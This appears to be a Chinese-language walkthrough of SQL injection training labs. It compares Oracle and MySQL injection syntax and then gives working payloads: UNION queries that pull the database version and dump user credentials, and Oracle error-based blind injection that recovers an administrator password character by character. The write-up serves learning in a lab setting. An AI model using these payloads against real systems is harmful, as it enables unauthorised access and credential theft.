Lab3: SQL injection attack, querying the database type and version on Oracle

Oracle数据库的SQL注入

这里先学习一下Oracle和Mysql的区别

目的 MySQL Oracle
闭合字符串 ' '
修改条件 OR 1=1 OR 1=1
统计列数 ORDER BY 1、ORDER BY 2 基本一样
联合查询 UNION SELECT UNION SELECT
查询版本 @@version 或 version() BANNER FROM v$version
查看表 information_schema.tables user_tables、all_tables
字符串拼接 CONCAT(a,b) `a
注释 -- 、#、/*...*/ --、/*...*/，一般没有 MySQL 的 #
无表查询常量 SELECT 'test' 常见写法是 SELECT 'test' FROM dual

这个题是让我们显示出来数据库的版本信息，那就是拼接一下数据库的特有语法union select BANNER from v$version

要想使用union拼接，肯定要知道查询一下类别会出来几列的数据

直接拼接一下payload

?category=Gifts'+union+select+BANNER,NULL+from+v$version--就解决了

Lab5: SQL injection attack, listing the database contents on non-Oracle databases

直接查到数据库里面存放有用户账号密码的表，直接用查到的账户密码登陆administrator

?category=Accessories%27%20UNION%20SELECT%20username_lndcsp%2Cpassword_vhpwtr%20FROM%20users_gwzllf--+

然后直接从表中查数据，查到数据直接登陆即可

Lab12: Blind SQL injection with conditional errors

这道题目是条件错误的SQL盲注，而且还是Oracle数据库

先构造一个查询

'||(select '' from dual)||'

发现是正常的

然后再构造一个肯定不正常的查询

'||(select '' from dual)||' 出现报错。这个时候就可以确认，sql语句肯定被带入查询了

然后查询是否存在users表

' ||(select '' from users where rownum=1)||'--,页面返回是正常的

构造一个查询的语句，让条件永真，然后我们去查一些我们想要知道的东西，如果我们查到了，就一定会报错

那么来查询一下到底存不存在这个管理员用户

'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'

报错了，那么肯定是存在的

然后判断他的密码的长度

'||(select case when length(password)>1 then to_char(1/0) else '' end from users where username='administrator')||'

一致报错，知道密码的长度大于20的时候，不报错了，那么就判断密码长度是20

那么下一步就肯定是要爆破密码了，和上一题一样，只不过换了个数据库，用的函数不一样

'||(select case when substr(password,1,1)='a' then to_char(1/0) else '' end from users where username='administrator')||'

这里用的是substr(),用法一致
